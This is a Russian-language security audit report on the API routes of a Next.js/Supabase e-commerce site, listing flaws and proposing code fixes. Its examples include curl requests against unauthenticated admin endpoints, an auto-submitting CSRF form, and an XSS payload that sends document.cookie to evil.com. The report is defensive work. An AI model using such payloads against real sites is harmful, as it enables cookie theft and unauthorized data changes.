# 🔐 Security Audit Report - API Routes

**Дата аудита:** 1 декабря 2025  
**Проверенные файлы:** Все API routes в `app/api/**/route.ts`

---

## 📊 Общая статистика

- **Всего проверено API routes:** ~47
- **Критичных проблем:** 8
- **Предупреждений:** 12
- **Рекомендаций:** 7

---

## 🚨 КРИТИЧНЫЕ ПРОБЛЕМЫ (требуют немедленного исправления)

### 1. ❌ Отсутствие аутентификации в Admin API routes

**Файлы:**
- `app/api/admin/orders/route.ts`
- `app/api/admin/products/route.ts`
- `app/api/admin/products/[id]/route.ts`
- `app/api/admin/users/route.ts`
- `app/api/admin/coupons/route.ts`
- `app/api/admin/reviews/route.ts`
- `app/api/admin/newsletter/send/route.ts`
- Все остальные `/api/admin/**` endpoints

**Проблема:**  
API routes в `/api/admin/**` НЕ проверяют аутентификацию и роль пользователя. Middleware защищает только UI страницы (`/admin`), но не API endpoints. Любой пользователь может отправить прямой запрос к этим API и получить/изменить данные.

**Пример уязвимости:**
```bash
# Любой может получить список всех пользователей
curl https://your-site.com/api/admin/users

# Любой может создать/удалить товары
curl -X POST https://your-site.com/api/admin/products -d '{...}'
curl -X DELETE https://your-site.com/api/admin/products/123
```

**Рекомендация:**  
Создать helper функцию для проверки admin прав и добавить её во все admin routes:

```typescript
// lib/security/auth.ts
import { createServerSupabaseClient } from '@/lib/supabase/server';

export async function checkAdminAuth(request: NextRequest) {
    const supabase = await createServerSupabaseClient();
    const { data: { user }, error: authError } = await supabase.auth.getUser();

    if (authError || !user) {
        return { authorized: false, error: 'Unauthorized' };
    }

    // Check admin role
    const { data: profile } = await supabase
        .from('profiles')
        .select('role')
        .eq('id', user.id)
        .single();

    if (profile?.role !== 'admin') {
        return { authorized: false, error: 'Forbidden - Admin access required' };
    }

    return { authorized: true, user };
}

// Использование в каждом admin route:
export async function GET(request: NextRequest) {
    const auth = await checkAdminAuth(request);
    if (!auth.authorized) {
        return NextResponse.json({ error: auth.error }, { status: 401 });
    }
    
    // Остальная логика...
}
```

---

### 2. ❌ Отсутствие CSRF защиты

**Проблема:**  
Все POST/PATCH/DELETE endpoints не проверяют CSRF токены. Возможна атака CSRF (Cross-Site Request Forgery).

**Пример атаки:**
```html
<!-- Злоумышленник может создать страницу: -->
<form action="https://your-site.com/api/admin/products/123" method="POST">
    <input type="hidden" name="in_stock" value="false">
</form>
<script>document.forms[0].submit();</script>
```

**Рекомендация:**  
1. Использовать SameSite cookies для сессий (уже настроено в Supabase)
2. Добавить проверку Origin/Referer headers в критичных endpoints
3. Для admin endpoints - обязательная двойная аутентификация

```typescript
// lib/security/csrf.ts
export function checkOrigin(request: NextRequest): boolean {
    const origin = request.headers.get('origin');
    const referer = request.headers.get('referer');
    const host = request.headers.get('host');
    
    const allowedOrigins = [
        process.env.NEXT_PUBLIC_SITE_URL,
        `https://${host}`,
        `http://${host}`
    ];
    
    if (origin && !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
        return false;
    }
    
    return true;
}
```

---

### 3. ⚠️ Слабая валидация в некоторых endpoints

**Файлы:**
- `app/api/orders/route.ts` (строки 100-115)
- `app/api/reviews/route.ts` (строки 138-145)
- `app/api/admin/products/route.ts` (строки 48-95)

**Проблема:**  
Используется базовая валидация без Zod schemas. Возможны XSS и инъекции через невалидированные поля.

**Пример в `orders/route.ts`:**
```typescript
if (!firstName || !lastName || !email || !phone) {
    return NextResponse.json({ error: 'Fehlende Kundendaten' }, { status: 400 });
}
```

**Проблемы:**
- Нет проверки типов данных
- Нет санитизации HTML
- Нет проверки длины строк
- Нет regex валидации для email/phone

**Рекомендация:**  
Добавить Zod schema для валидации:

```typescript
// В lib/security/validation.ts добавить:
export const createOrderManualSchema = z.object({
    firstName: z.string().min(1).max(100).trim(),
    lastName: z.string().min(1).max(100).trim(),
    email: z.string().email().max(255),
    phone: z.string().regex(/^[\d\s()+\-]+$/).min(5).max(20),
    items: z.array(z.object({
        id: z.string().uuid(),
        quantity: z.number().int().positive().max(100)
    })).min(1).max(50),
    notes: z.string().max(1000).optional().nullable(),
});

// В route.ts:
const validation = validateRequest(createOrderManualSchema, body);
if (!validation.success) {
    return NextResponse.json(
        { error: 'Invalid input', details: validation.errors },
        { status: 400 }
    );
}
```

---

### 4. ⚠️ Отсутствие санитизации HTML в user-generated content

**Файлы:**
- `app/api/reviews/route.ts` (строки 190-200)
- `app/api/contact/route.ts` (строки 30-50)
- `app/api/admin/newsletter/send/route.ts` (строки 100-120)

**Проблема:**  
User input (отзывы, сообщения) вставляется в HTML без санитизации. Возможны XSS атаки.

**Пример уязвимости:**
```javascript
// Пользователь отправляет отзыв:
{
    "comment": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
}

// Этот скрипт выполнится у других пользователей при просмотре отзывов
```

**Рекомендация:**  
Установить и использовать библиотеку для санитизации:

```bash
npm install dompurify isomorphic-dompurify
```

```typescript
import DOMPurify from 'isomorphic-dompurify';

// В reviews/route.ts:
const sanitizedComment = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: [], // Не разрешаем никакие HTML теги
    ALLOWED_ATTR: []
});

const sanitizedTitle = DOMPurify.sanitize(title, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
});
```

---

### 5. ⚠️ Чувствительные данные в логах

**Файлы:**
- Множество файлов используют `console.log` для вывода полных объектов

**Проблема:**  
В логи попадают чувствительные данные: email, phone, payment details, full order data.

**Примеры:**
```typescript
// app/api/checkout/route.ts:42
console.log('🛍️ Preparing checkout with items:', items.length);

// app/api/orders/route.ts:97
console.log('📝 Creating order with data:', { firstName, lastName, email, phone, itemsCount: items?.length });
```

**Рекомендация:**  
Создать безопасный logger:

```typescript
// lib/utils/logger.ts
export function safeLog(message: string, data?: any) {
    if (process.env.NODE_ENV === 'development') {
        console.log(message, sanitizeLogData(data));
    } else {
        // В production логировать в внешний сервис (Sentry, LogRocket)
        console.log(message); // Без данных
    }
}

function sanitizeLogData(data: any): any {
    if (!data) return data;
    
    const sensitive = ['email', 'phone', 'password', 'token', 'secret', 'key'];
    const sanitized = { ...data };
    
    for (const key of Object.keys(sanitized)) {
        if (sensitive.some(s => key.toLowerCase().includes(s))) {
            sanitized[key] = '***REDACTED***';
        }
    }
    
    return sanitized;
}
```

---

### 6. ⚠️ Отсутствие валидации webhook подписей в development

**Файл:** `app/api/webhooks/paypal/route.ts` (строки 86-89)

**Проблема:**
```typescript
if (webhookId && process.env.NODE_ENV === 'production') {
    const isValid = await verifyPayPalWebhook(webhookId, request.headers, body);
    if (!isValid) {
        return NextResponse.json({ error: 'Invalid signature' }, { status: 401 });
    }
}
```

В development режиме подпись НЕ проверяется! Злоумышленник может отправить поддельные webhook'и.

**Рекомендация:**  
Всегда проверять подписи:

```typescript
// Проверка должна быть всегда, независимо от окружения
if (!webhookId) {
    console.warn('⚠️ PAYPAL_WEBHOOK_ID not configured - skipping verification');
    // В production это должно быть ошибкой:
    if (process.env.NODE_ENV === 'production') {
        return NextResponse.json({ error: 'Webhook not configured' }, { status: 500 });
    }
} else {
    const isValid = await verifyPayPalWebhook(webhookId, request.headers, body);
    if (!isValid) {
        console.error('❌ Invalid PayPal webhook signature');
        return NextResponse.json({ error: 'Invalid signature' }, { status: 401 });
    }
}
```

---

### 7. ⚠️ Открытый test-email endpoint

**Файл:** `app/api/test-email/route.ts`

**Проблема:**  
Endpoint доступен в production без аутентификации. Любой может отправлять email от имени вашего магазина.

**Пример атаки:**
```bash
curl -X POST https://your-site.com/api/test-email \
  -d '{"orderId": "any-id"}' \
  -H "Content-Type: application/json"
```

**Рекомендация:**  
1. Удалить в production
2. Или добавить проверку admin прав
3. Или добавить secret key

```typescript
export async function POST(request: NextRequest) {
    // Вариант 1: Только для development
    if (process.env.NODE_ENV === 'production') {
        return NextResponse.json({ error: 'Not available in production' }, { status: 404 });
    }
    
    // Вариант 2: Проверка admin прав
    const auth = await checkAdminAuth(request);
    if (!auth.authorized) {
        return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }
    
    // Вариант 3: Secret key
    const secret = request.headers.get('x-test-secret');
    if (secret !== process.env.TEST_SECRET) {
        return NextResponse.json({ error: 'Invalid secret' }, { status: 401 });
    }
    
    // Остальная логика...
}
```

---

### 8. ⚠️ Незащищенный endpoint получения API ключей

**Файлы:**
- `app/api/payment/stripe-key/route.ts`
- `app/api/payment/paypal-key/route.ts`

**Проблема:**  
Endpoints возвращают публичные ключи без rate limiting. Можно использовать для DoS атак или мониторинга режима работы (test/live).

**Текущий код:**
```typescript
export async function GET() {
    // Нет rate limiting!
    // Нет проверки origin!
    return NextResponse.json({ publishableKey, mode, currency });
}
```

**Рекомендация:**  
Добавить rate limiting и проверку origin:

```typescript
export async function GET(request: NextRequest) {
    // Rate limiting
    const rateLimitResult = rateLimit(request, RATE_LIMITS.public);
    if (!rateLimitResult.success) {
        return NextResponse.json(
            { error: 'Too many requests' },
            { status: 429 }
        );
    }
    
    // Проверка origin (опционально)
    if (!checkOrigin(request)) {
        return NextResponse.json({ error: 'Invalid origin' }, { status: 403 });
    }
    
    // Остальная логика...
}
```

---

## ⚠️ ПРЕДУПРЕЖДЕНИЯ (рекомендуется исправить)

### 9. Rate limiting не везде используется оптимально

**Проблема:**  
Некоторые endpoints используют одинаковые лимиты для разных операций.

**Файлы:**
- `app/api/orders/[orderId]/route.ts` - нет rate limiting для GET
- `app/api/products/[slug]/route.ts` - нет rate limiting

**Рекомендация:**  
Добавить rate limiting во все endpoints с разными лимитами:

```typescript
// В lib/security/rate-limit.ts добавить:
export const RATE_LIMITS = {
    // ... существующие
    orderDetail: { maxRequests: 50, windowMs: 60000 }, // 50 req/min
    productDetail: { maxRequests: 200, windowMs: 60000 }, // 200 req/min
};
```

---

### 10. Недостаточная валидация UUID

**Проблема:**  
В некоторых endpoints UUID не валидируются, что может привести к ошибкам БД.

**Примеры:**
- `app/api/orders/[orderId]/route.ts`
- `app/api/products/[id]/route.ts`

**Рекомендация:**  
Добавить валидацию UUID:

```typescript
import { z } from 'zod';

const uuidSchema = z.string().uuid();

export async function GET(request: NextRequest, { params }: { params: { orderId: string } }) {
    const validation = uuidSchema.safeParse(params.orderId);
    if (!validation.success) {
        return NextResponse.json({ error: 'Invalid order ID' }, { status: 400 });
    }
    
    const orderId = validation.data;
    // Остальная логика...
}
```

---

### 11. Отсутствие timeout для внешних API запросов

**Файлы:**
- `app/api/paypal/create-order/route.ts` (строка 45-55)
- `app/api/webhooks/paypal/route.ts` (строки 35-50)

**Проблема:**  
Есть timeout, но он может быть недостаточным или не обрабатывается правильно.

**Текущий код:**
```typescript
const controller = new AbortController();
const timeout = setTimeout(() => controller.abort(), 10000);

try {
    const response = await fetch(url, { signal: controller.signal });
    // ...
} finally {
    clearTimeout(timeout); // ✅ Хорошо!
}
```

**Рекомендация:**  
Добавить обработку AbortError:

```typescript
try {
    const response = await fetch(url, { signal: controller.signal });
    // ...
} catch (error) {
    if (error.name === 'AbortError') {
        console.error('Request timeout');
        return NextResponse.json(
            { error: 'Request timeout. Please try again.' },
            { status: 504 }
        );
    }
    throw error;
} finally {
    clearTimeout(timeout);
}
```

---

### 12. Использование Service Role Key в клиентском коде

**Файлы:**
- `app/api/products/route.ts` (строки 13-14)
- `app/api/unsubscribe/route.ts` (строки 7-8)

**Проблема:**  
Service Role Key используется там, где можно использовать обычный клиент с RLS.

**Текущий код:**
```typescript
// app/api/products/route.ts
const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!  // ❌ Слишком мощный ключ
);
```

**Рекомендация:**  
Использовать Service Role только там, где нужно обойти RLS. Для публичных данных использовать обычный клиент:

```typescript
// Для публичных продуктов
import { createServerClient } from '@supabase/ssr';

const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    { /* cookies config */ }
);
```

---

### 13. Отсутствие проверки типов для order status

**Файл:** `app/api/admin/orders/[orderId]/route.ts`

**Проблема:**  
Статус заказа принимается без валидации из request body.

**Текущий код:**
```typescript
const { status, payment_status, notes } = body;

const { data: order, error } = await supabaseAdmin
    .from('orders')
    .update({ status, payment_status, notes })
    // Можно установить любой статус!
```

**Рекомендация:**  
Добавить enum validation:

```typescript
const updateOrderSchema = z.object({
    status: z.enum(['pending', 'processing', 'completed', 'cancelled']).optional(),
    payment_status: z.enum(['pending', 'paid', 'completed', 'failed', 'refunded']).optional(),
    notes: z.string().max(1000).optional().nullable(),
});

const validation = validateRequest(updateOrderSchema, body);
if (!validation.success) {
    return NextResponse.json(
        { error: 'Invalid input', details: validation.errors },
        { status: 400 }
    );
}
```

---

### 14. Email injection в newsletter

**Файл:** `app/api/newsletter/route.ts` (строки 26-40)

**Проблема:**  
Email валидируется только regex, без проверки на вредоносные символы.

**Текущий код:**
```typescript
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if (!emailRegex.test(email)) {
    return NextResponse.json({ error: 'Invalid email format' }, { status: 400 });
}
```

**Рекомендация:**  
Использовать более строгую валидацию и санитизацию:

```typescript
import { z } from 'zod';

const emailSchema = z.string()
    .email()
    .max(255)
    .toLowerCase()
    .trim()
    .refine(
        (email) => !email.includes('\n') && !email.includes('\r'),
        'Email contains invalid characters'
    );

const result = emailSchema.safeParse(email);
if (!result.success) {
    return NextResponse.json(
        { error: 'Invalid email format' },
        { status: 400 }
    );
}
const sanitizedEmail = result.data;
```

---

### 15. Отсутствие CORS настроек

**Проблема:**  
API endpoints не настроены для работы с CORS. Может быть проблема при интеграции с внешними сервисами.

**Рекомендация:**  
Добавить CORS middleware или настройки в критичных endpoints:

```typescript
// lib/security/cors.ts
export function addCorsHeaders(response: NextResponse, origin?: string): NextResponse {
    const allowedOrigins = [
        process.env.NEXT_PUBLIC_SITE_URL!,
        'https://your-domain.com',
    ];
    
    if (origin && allowedOrigins.includes(origin)) {
        response.headers.set('Access-Control-Allow-Origin', origin);
    }
    
    response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
    response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    response.headers.set('Access-Control-Max-Age', '86400');
    
    return response;
}

// В endpoints:
export async function OPTIONS(request: NextRequest) {
    return addCorsHeaders(new NextResponse(null, { status: 200 }), request.headers.get('origin'));
}
```

---

### 16. SQL Injection через .ilike()

**Файл:** `app/api/products/route.ts` (строка 44)

**Проблема:**  
Пользовательский поисковый запрос передается в `.ilike()` без экранирования специальных символов.

**Текущий код:**
```typescript
if (search) {
    query = query.ilike('name', `%${search}%`);
}
```

**Уязвимость:**  
Пользователь может ввести `%` или `_` для wildcard поиска, что может привести к DoS или утечке данных.

**Рекомендация:**  
Экранировать специальные символы LIKE:

```typescript
function escapeLike(str: string): string {
    return str.replace(/[%_]/g, '\\$&');
}

if (search) {
    const escapedSearch = escapeLike(search);
    query = query.ilike('name', `%${escapedSearch}%`);
}
```

---

### 17. Недостаточная валидация file uploads

**Файл:** `app/api/admin/products/upload-image/route.ts`

**Проблема:**  
Нужно проверить этот файл на предмет:
- Валидации типа файла
- Валидации размера файла
- Проверки на вредоносный контент

**Рекомендация:**  
Добавить строгую валидацию:

```typescript
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp'];

export async function POST(request: NextRequest) {
    const formData = await request.formData();
    const file = formData.get('file') as File;
    
    if (!file) {
        return NextResponse.json({ error: 'No file provided' }, { status: 400 });
    }
    
    // Проверка размера
    if (file.size > MAX_FILE_SIZE) {
        return NextResponse.json(
            { error: 'File too large. Maximum size: 5MB' },
            { status: 400 }
        );
    }
    
    // Проверка типа
    if (!ALLOWED_TYPES.includes(file.type)) {
        return NextResponse.json(
            { error: 'Invalid file type. Allowed: JPEG, PNG, WebP' },
            { status: 400 }
        );
    }
    
    // Проверка на вредоносный контент (опционально)
    // Можно использовать библиотеку как file-type для проверки MIME типа
    
    // Остальная логика...
}
```

---

### 18. Отсутствие проверки на дублирование email

**Файл:** `app/api/newsletter/route.ts`

**Состояние:** ✅ **Проверка есть, но можно улучшить**

**Текущий код:**
```typescript
const { data: existingSubscriber } = await supabase
    .from('newsletter_subscribers')
    .select('id, email, is_active')
    .eq('email', email.toLowerCase())
    .single();
```

**Рекомендация:**  
Добавить unique constraint на уровне БД и обработку race condition:

```sql
-- В migration
ALTER TABLE newsletter_subscribers 
ADD CONSTRAINT newsletter_subscribers_email_unique 
UNIQUE (email);
```

---

### 19. Middleware не защищает API routes

**Файл:** `middleware.ts` (строки 100-111)

**Проблема:**  
Middleware проверяет только UI маршруты `/admin`, но НЕ проверяет `/api/admin/**`.

**Текущий код:**
```typescript
export const config = {
    matcher: [
        // Не включает /api/admin/** !
    ]
};
```

**Рекомендация:**  
Добавить API routes в matcher:

```typescript
export const config = {
    matcher: [
        '/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)',
        '/api/admin/:path*', // ✅ Защитить admin API
    ]
};

// И добавить проверку в middleware:
if (request.nextUrl.pathname.startsWith('/api/admin')) {
    if (!user) {
        return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }
    
    const { data: profile } = await supabase
        .from('profiles')
        .select('role')
        .eq('id', user.id)
        .single();
    
    if (profile?.role !== 'admin') {
        return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
    }
}
```

---

### 20. Отсутствие audit logging для критичных операций

**Проблема:**  
Не все критичные операции логируются в `audit_log`.

**Операции требующие логирования:**
- Изменение цен товаров
- Удаление товаров
- Изменение статуса заказов
- Создание/удаление купонов
- Изменение ролей пользователей
- Отправка массовых email рассылок

**Рекомендация:**  
Добавить audit logging во все критичные endpoints:

```typescript
import { createAuditLog } from '@/lib/security/audit-log';

// В app/api/admin/products/[id]/route.ts
export async function DELETE(request: NextRequest, { params }: { params: { id: string } }) {
    const auth = await checkAdminAuth(request);
    if (!auth.authorized) return /* error */;
    
    // Сначала получаем данные для логирования
    const { data: product } = await supabaseAdmin
        .from('products')
        .select('id, name, price')
        .eq('id', params.id)
        .single();
    
    // Удаляем
    const { error } = await supabaseAdmin
        .from('products')
        .delete()
        .eq('id', params.id);
    
    if (!error) {
        // Логируем
        await createAuditLog({
            action: 'product.delete',
            userId: auth.user.id,
            resourceType: 'product',
            resourceId: params.id,
            metadata: {
                productName: product?.name,
                price: product?.price
            }
        });
    }
    
    // ...
}
```

---

## 📋 РЕКОМЕНДАЦИИ (хорошо бы добавить)

### 21. Добавить request ID для трейсинга

**Рекомендация:**  
Добавить уникальный request ID в каждый запрос для лучшего debugging:

```typescript
// lib/utils/request-id.ts
import { nanoid } from 'nanoid';

export function getRequestId(request: NextRequest): string {
    return request.headers.get('x-request-id') || nanoid();
}

// Использование:
export async function POST(request: NextRequest) {
    const requestId = getRequestId(request);
    console.log(`[${requestId}] Processing request...`);
    
    // В response header:
    return NextResponse.json(data, {
        headers: { 'X-Request-ID': requestId }
    });
}
```

---

### 22. Добавить health check endpoint

**Рекомендация:**  
Создать endpoint для мониторинга состояния API:

```typescript
// app/api/health/route.ts
import { NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase/admin';

export async function GET() {
    const checks = {
        api: 'ok',
        database: 'unknown',
        timestamp: new Date().toISOString(),
    };
    
    try {
        // Проверка БД
        await supabaseAdmin.from('products').select('id').limit(1);
        checks.database = 'ok';
    } catch (error) {
        checks.database = 'error';
    }
    
    const status = Object.values(checks).every(v => v === 'ok' || v === checks.timestamp) 
        ? 200 
        : 503;
    
    return NextResponse.json(checks, { status });
}
```

---

### 23. Использовать type-safe environment variables

**Рекомендация:**  
Создать type-safe конфигурацию для env переменных:

```typescript
// lib/config/env.ts
import { z } from 'zod';

const envSchema = z.object({
    // Supabase
    NEXT_PUBLIC_SUPABASE_URL: z.string().url(),
    NEXT_PUBLIC_SUPABASE_ANON_KEY: z.string().min(1),
    SUPABASE_SERVICE_ROLE_KEY: z.string().min(1),
    
    // Stripe
    STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
    STRIPE_WEBHOOK_SECRET: z.string().startsWith('whsec_'),
    NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY_TEST: z.string().startsWith('pk_test_'),
    NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY_LIVE: z.string().startsWith('pk_live_'),
    
    // PayPal
    PAYPAL_CLIENT_ID: z.string().min(1),
    PAYPAL_CLIENT_SECRET: z.string().min(1),
    PAYPAL_WEBHOOK_ID: z.string().optional(),
    
    // Email
    RESEND_API_KEY: z.string().startsWith('re_'),
    EMAIL_FROM: z.string().email(),
    ADMIN_EMAIL: z.string().email(),
    
    // Site
    NEXT_PUBLIC_SITE_URL: z.string().url(),
    NODE_ENV: z.enum(['development', 'production', 'test']),
});

export const env = envSchema.parse(process.env);
```

---

### 24. Добавить API versioning

**Рекомендация:**  
Для будущих изменений API добавить версионирование:

```
/api/v1/products
/api/v1/orders
/api/v2/products (с новыми полями)
```

---

### 25. Использовать API keys для внешних интеграций

**Рекомендация:**  
Если планируется предоставлять API для внешних систем, добавить систему API keys:

```typescript
// app/api/external/orders/route.ts
export async function GET(request: NextRequest) {
    const apiKey = request.headers.get('x-api-key');
    
    if (!apiKey) {
        return NextResponse.json({ error: 'API key required' }, { status: 401 });
    }
    
    // Проверка API key в БД
    const { data: keyData } = await supabaseAdmin
        .from('api_keys')
        .select('id, user_id, permissions')
        .eq('key', apiKey)
        .eq('is_active', true)
        .single();
    
    if (!keyData) {
        return NextResponse.json({ error: 'Invalid API key' }, { status: 401 });
    }
    
    // Проверка permissions
    if (!keyData.permissions.includes('orders.read')) {
        return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
    }
    
    // Остальная логика...
}
```

---

### 26. Добавить мониторинг производительности

**Рекомендация:**  
Добавить отслеживание времени выполнения запросов:

```typescript
// lib/utils/performance.ts
export async function measurePerformance<T>(
    fn: () => Promise<T>,
    operationName: string
): Promise<T> {
    const start = performance.now();
    
    try {
        const result = await fn();
        const duration = performance.now() - start;
        
        if (duration > 1000) {
            console.warn(`⚠️ Slow operation: ${operationName} took ${duration.toFixed(2)}ms`);
        }
        
        return result;
    } catch (error) {
        const duration = performance.now() - start;
        console.error(`❌ Failed operation: ${operationName} took ${duration.toFixed(2)}ms`, error);
        throw error;
    }
}

// Использование:
const orders = await measurePerformance(
    () => supabaseAdmin.from('orders').select('*'),
    'Fetch all orders'
);
```

---

### 27. Добавить документацию API (OpenAPI/Swagger)

**Рекомендация:**  
Создать OpenAPI спецификацию для API endpoints. Можно использовать `next-swagger-doc`.

---

## ✅ ЧТО УЖЕ ХОРОШО РЕАЛИЗОВАНО

### 1. ✅ Rate Limiting
- Используется во всех критичных endpoints
- Настроены разные лимиты для разных типов операций
- Правильная обработка 429 ошибок с Retry-After header

### 2. ✅ Webhook подписи проверяются
- Stripe webhooks: полная верификация через `stripe.webhooks.constructEvent()`
- PayPal webhooks: реализована верификация через PayPal API

### 3. ✅ Payment deduplication
- Используется `isPaymentProcessed()` и `markPaymentAsProcessed()`
- Предотвращает двойное списание со склада
- Использует уникальный `payment_id` для идемпотентности

### 4. ✅ Валидация для checkout
- Используется Zod schema (`checkoutSchema`)
- Проверяются все обязательные поля
- Валидация UUID, email, phone

### 5. ✅ Правильное использование supabaseAdmin
- Service Role Key используется на сервере
- Нет утечки ключей на клиент
- Правильная настройка auth options

### 6. ✅ Обработка ошибок
- Try-catch блоки во всех endpoints
- Логирование ошибок
- Правильные HTTP статус коды

### 7. ✅ CORS/Security Headers
- Настроены через `lib/security/headers.ts`
- Добавляются через middleware

### 8. ✅ Stock management
- Атомарное уменьшение через `decreaseStock()`
- Логирование всех изменений в `stock_logs`
- Проверка availability перед созданием заказа

### 9. ✅ Audit logging
- Используется в критичных местах (payments, refunds)
- Логирует userId, action, resourceId, metadata

### 10. ✅ Environment variables
- Используются правильно через `process.env`
- Есть fallback значения где нужно
- Не хардкодятся чувствительные данные

---

## 🎯 ПРИОРИТЕТЫ ИСПРАВЛЕНИЯ

### Немедленно (Critical):
1. **Добавить аутентификацию в Admin API** (проблема #1)
2. **Добавить защиту middleware для `/api/admin/**`** (проблема #19)
3. **Удалить или защитить test-email endpoint** (проблема #7)
4. **Добавить санитизацию HTML** (проблема #4)

### В ближайшее время (High):
5. Добавить CSRF защиту (проблема #2)
6. Добавить Zod валидацию во все endpoints (проблема #3)
7. Убрать чувствительные данные из логов (проблема #5)
8. Добавить rate limiting в endpoints без него (проблема #9)

### Когда будет время (Medium):
9. Добавить UUID валидацию (проблема #10)
10. Улучшить обработку timeouts (проблема #11)
11. Добавить enum validation для статусов (проблема #13)
12. Экранировать LIKE queries (проблема #16)

### Nice to have (Low):
13. Добавить request ID трейсинг (рекомендация #21)
14. Создать health check endpoint (рекомендация #22)
15. Type-safe env variables (рекомендация #23)
16. Audit logging для всех операций (проблема #20)

---

## 📝 ПРИМЕР ИСПРАВЛЕННОГО ADMIN ROUTE

```typescript
// app/api/admin/products/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase/admin';
import { rateLimit, RATE_LIMITS } from '@/lib/security/rate-limit';
import { checkAdminAuth } from '@/lib/security/auth';
import { validateRequest, createProductSchema } from '@/lib/security/validation';
import { createAuditLog } from '@/lib/security/audit-log';
import { getRequestId } from '@/lib/utils/request-id';

export async function GET(request: NextRequest) {
    const requestId = getRequestId(request);
    
    // 1. Rate limiting
    const rateLimitResult = rateLimit(request, RATE_LIMITS.admin);
    if (!rateLimitResult.success) {
        return NextResponse.json(
            { error: 'Too many requests' },
            { status: 429, headers: { 'Retry-After': rateLimitResult.retryAfter.toString() }}
        );
    }
    
    // 2. Authentication & Authorization
    const auth = await checkAdminAuth(request);
    if (!auth.authorized) {
        console.warn(`[${requestId}] Unauthorized admin access attempt`);
        return NextResponse.json({ error: auth.error }, { status: 401 });
    }
    
    try {
        const { data, error } = await supabaseAdmin
            .from('products')
            .select('*')
            .order('created_at', { ascending: false });
        
        if (error) {
            console.error(`[${requestId}] Error fetching products:`, error);
            return NextResponse.json(
                { error: 'Failed to load products' },
                { status: 500 }
            );
        }
        
        return NextResponse.json(data, {
            headers: { 'X-Request-ID': requestId }
        });
    } catch (error: any) {
        console.error(`[${requestId}] Exception:`, error);
        return NextResponse.json(
            { error: 'Internal server error' },
            { status: 500 }
        );
    }
}

export async function POST(request: NextRequest) {
    const requestId = getRequestId(request);
    
    // 1. Rate limiting
    const rateLimitResult = rateLimit(request, RATE_LIMITS.admin);
    if (!rateLimitResult.success) {
        return NextResponse.json(
            { error: 'Too many requests' },
            { status: 429 }
        );
    }
    
    // 2. Authentication & Authorization
    const auth = await checkAdminAuth(request);
    if (!auth.authorized) {
        return NextResponse.json({ error: auth.error }, { status: 401 });
    }
    
    try {
        const body = await request.json();
        
        // 3. Validation
        const validation = validateRequest(createProductSchema, body);
        if (!validation.success) {
            console.warn(`[${requestId}] Validation failed:`, validation.errors);
            return NextResponse.json(
                { error: 'Invalid input', details: validation.errors },
                { status: 400 }
            );
        }
        
        const validData = validation.data;
        
        // 4. Business logic
        const slug = makeSlug(validData.name);
        
        const { data, error } = await supabaseAdmin
            .from('products')
            .insert({
                name: validData.name,
                slug,
                price: validData.price,
                category: validData.category,
                description: validData.description,
                images: validData.images,
                brand: validData.brand || null,
                compare_at_price: validData.compareAtPrice || null,
                in_stock: validData.inStock,
                stock_quantity: validData.stockQuantity,
                tags: Array.isArray(validData.tags) ? validData.tags : [],
            })
            .select()
            .single();
        
        if (error) {
            console.error(`[${requestId}] DB error:`, error);
            return NextResponse.json(
                { error: 'Failed to create product' },
                { status: 500 }
            );
        }
        
        // 5. Audit logging
        await createAuditLog({
            action: 'product.create',
            userId: auth.user.id,
            resourceType: 'product',
            resourceId: data.id,
            metadata: {
                productName: data.name,
                price: data.price,
                category: data.category,
            }
        });
        
        console.log(`[${requestId}] Product created:`, data.id);
        
        return NextResponse.json(data, {
            headers: { 'X-Request-ID': requestId }
        });
    } catch (error: any) {
        console.error(`[${requestId}] Exception:`, error);
        return NextResponse.json(
            { error: 'Internal server error' },
            { status: 500 }
        );
    }
}

function makeSlug(name: string): string {
    return name
        .toLowerCase()
        .trim()
        .replace(/\s+/g, '-')
        .replace(/[^a-z0-9-]/g, '')
        .slice(0, 60);
}
```

---

## 📊 ИТОГОВАЯ ОЦЕНКА БЕЗОПАСНОСТИ

**Текущий статус:** ⚠️ **Medium Risk**

**Сильные стороны:**
- ✅ Rate limiting реализован хорошо
- ✅ Webhook верификация работает
- ✅ Payment deduplication предотвращает двойные платежи
- ✅ Stock management атомарный и безопасный
- ✅ Используется supabaseAdmin правильно

**Критичные проблемы:**
- ❌ Admin API не защищены аутентификацией
- ❌ Middleware не защищает API routes
- ❌ Открытый test-email endpoint
- ❌ Нет санитизации HTML в user input

**После исправления критичных проблем:** ✅ **Low Risk**

---

## 🔧 ПЛАН ДЕЙСТВИЙ

### Шаг 1: Создать helper функции (1-2 часа)
```bash
lib/security/auth.ts          # checkAdminAuth()
lib/security/csrf.ts          # checkOrigin()
lib/utils/request-id.ts       # getRequestId()
lib/utils/logger.ts           # safeLog()
lib/utils/sanitize.ts         # sanitizeHtml()
```

### Шаг 2: Защитить Admin API (2-3 часа)
- Добавить `checkAdminAuth()` во все `/api/admin/**` routes
- Обновить middleware config
- Добавить audit logging

### Шаг 3: Улучшить валидацию (2-3 часа)
- Добавить Zod schemas для всех endpoints без валидации
- Добавить санитизацию HTML
- Добавить UUID валидацию

### Шаг 4: Убрать test endpoint (5 минут)
- Удалить `app/api/test-email/route.ts` или защитить его
